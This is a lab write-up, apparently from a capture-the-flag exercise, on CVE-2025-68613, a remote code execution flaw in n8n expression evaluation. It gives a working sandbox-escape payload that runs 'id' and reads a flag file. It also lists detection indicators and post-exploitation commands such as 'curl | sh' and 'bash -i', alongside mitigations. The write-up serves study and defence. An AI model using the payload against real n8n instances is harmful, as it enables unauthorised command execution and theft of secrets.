# n8n Expression Injection Remote Code Execution (CVE-2025-68613)

## Overview

This project analyzes CVE-2025-68613, a critical Remote Code Execution (RCE) vulnerability affecting the n8n workflow automation platform. The vulnerability arises from insecure evaluation of user-controlled workflow expressions, allowing authenticated users to escape the intended execution context and execute arbitrary operating system commands.

This assessment examines the vulnerability's root cause, demonstrates exploitation through the n8n workflow interface, and develops practical detection and mitigation strategies.

---

## Vulnerability Information

| Attribute          | Value                 |
| ------------------ | --------------------- |
| CVE                | CVE-2025-68613        |
| Severity           | Critical              |
| CVSS               | 9.9                   |
| Platform           | n8n                   |
| Vulnerability Type | Expression Injection  |
| Impact             | Remote Code Execution |
| Authentication     | Required              |

---

## Objective

The goals of this assessment were to:

* Analyze n8n's expression evaluation architecture
* Investigate the root cause of CVE-2025-68613
* Demonstrate authenticated remote code execution
* Understand Node.js sandbox escape techniques
* Develop detection strategies
* Create defensive monitoring rules

---

## Attack Path

```text
Authenticated User Access
            ↓
Workflow Creation
            ↓
Expression Injection
            ↓
JavaScript Execution
            ↓
Node.js Runtime Access
            ↓
Module System Access
            ↓
child_process Execution
            ↓
Operating System Command Execution
            ↓
Remote Code Execution
```

---

## MITRE ATT&CK Mapping

| Tactic         | Technique                                 |
| -------------- | ----------------------------------------- |
| Initial Access | T1190 – Exploit Public-Facing Application |
| Execution      | T1059.007 – JavaScript                    |
| Execution      | T1059.004 – Unix Shell                    |
| Discovery      | T1082 – System Information Discovery      |
| Collection     | T1005 – Data from Local System            |

---

## Environment

| Component           | Version            |
| ------------------- | ------------------ |
| Platform            | n8n                |
| Affected Versions   | 0.211.0 – 1.120.3  |
| Runtime             | Node.js            |
| Exploitation Method | Browser-based      |
| Access Level        | Authenticated User |

---

# Technical Background

n8n executes workflow expressions wrapped inside:

```javascript
{{ expression }}
```

These expressions are evaluated as JavaScript during workflow execution.

Example:

```javascript
{{ $json.email }}
```

The vulnerability exists because user expressions are evaluated without sufficient sandbox isolation.

---

# Root Cause Analysis

The core security failure occurs because the expression evaluator exposes internal Node.js runtime objects.

The attacker can traverse the following execution chain:

```text
Expression Sandbox
        ↓
this
        ↓
process
        ↓
mainModule
        ↓
require()
        ↓
child_process
        ↓
execSync()
```

This results in complete sandbox escape.

---

# Phase 1: Initial Access

After authenticating to n8n:

* Created a new workflow
* Added a Manual Trigger node
* Added an Edit Fields (Set) node

This provided a location where arbitrary expressions could be evaluated.

---

# Phase 2: Payload Development

The following proof-of-concept payload was used:

```javascript
{{ (function(){
return this.process.mainModule
       .require('child_process')
       .execSync('id')
       .toString()
})() }}
```

---

# Payload Breakdown

### Step 1

Access global execution context:

```javascript
this
```

### Step 2

Access Node.js runtime:

```javascript
this.process
```

### Step 3

Access module loader:

```javascript
process.mainModule
```

### Step 4

Load dangerous module:

```javascript
.require('child_process')
```

### Step 5

Execute system command:

```javascript
.execSync('id')
```

### Step 6

Convert output:

```javascript
.toString()
```

---

# Phase 3: Exploitation

The payload was inserted into the workflow field:

```javascript
{{ (function(){
return this.process.mainModule
       .require('child_process')
       .execSync('id')
       .toString()
})() }}
```

The workflow was then executed.

---

# Command Execution Result

The command executed successfully:

```bash
uid=1000(n8n)
gid=1000(n8n)
groups=1000(n8n)
```

This confirmed arbitrary operating system command execution.

---

# Phase 4: Objective Completion

Additional commands were executed to retrieve sensitive information.

Example:

```javascript
{{ (function(){
return this.process.mainModule
       .require('child_process')
       .execSync('cat /flag.txt')
       .toString()
})() }}
```

### Result

```text
THM{n8n_exposed_workflow}
```

---

# Detection Engineering

Because n8n provides limited native logging, detection requires monitoring infrastructure external to the application.

Recommended telemetry sources include:

* Reverse proxy logs
* EDR telemetry
* Process creation events
* Audit logs
* SIEM correlation rules

---

# Reverse Proxy Detection

Recommended architecture:

```text
Internet
    ↓
Nginx Reverse Proxy
    ↓
Request Body Logging
    ↓
SIEM
    ↓
Detection Rules
    ↓
Alerting
```

---

# Sigma Detection Rule

A Sigma rule was developed to identify exploit attempts.

### Indicators

```text
this.process.mainModule
child_process
execSync(
(function(){
toString()
```

The detection focuses on:

* POST requests
* Workflow creation endpoints
* Known exploit primitives

---

# Post-Exploitation Detection

Following exploitation, defenders should monitor:

### Reconnaissance

```bash
id
whoami
uname -a
env
```

### Malware Delivery

```bash
wget
curl
chmod
bash
```

### Reverse Shell Activity

```bash
nc
bash -i
curl | sh
```

Detection sources include:

* EDR
* Sysmon
* auditd
* Process creation telemetry

---

# Impact Assessment

Successful exploitation enables attackers to:

* Execute arbitrary operating system commands
* Access secrets and credentials
* Deploy malware
* Establish persistence
* Perform reconnaissance
* Exfiltrate sensitive data
* Pivot to internal systems

---

# Defensive Mitigations

Recommended mitigations include:

* Upgrade to:

  * 1.120.4
  * 1.121.1
  * 1.122.0
* Restrict workflow permissions
* Treat authenticated users as untrusted
* Monitor expression execution
* Deploy reverse proxy logging
* Implement EDR monitoring
* Correlate web and process telemetry

---

# Skills Demonstrated

* Vulnerability Research
* Node.js Security
* Remote Code Execution
* Sandbox Escape Analysis
* Source Code Analysis
* Expression Injection
* Detection Engineering
* Sigma Rule Development
* Threat Hunting
* SIEM Engineering
* Security Research Methodology
* MITRE ATT&CK Mapping

---

# Key Lessons Learned

* Authentication is not a security boundary.
* Sandboxes fail when runtime internals are exposed.
* Node.js module access can quickly become RCE.
* Workflow automation platforms introduce unique attack surfaces.
* Detection engineering should accompany vulnerability research.
* Behavioral detection is more reliable than signature matching.

---

## Disclaimer

This research was conducted in an authorized laboratory environment for educational, defensive, and security research purposes only.
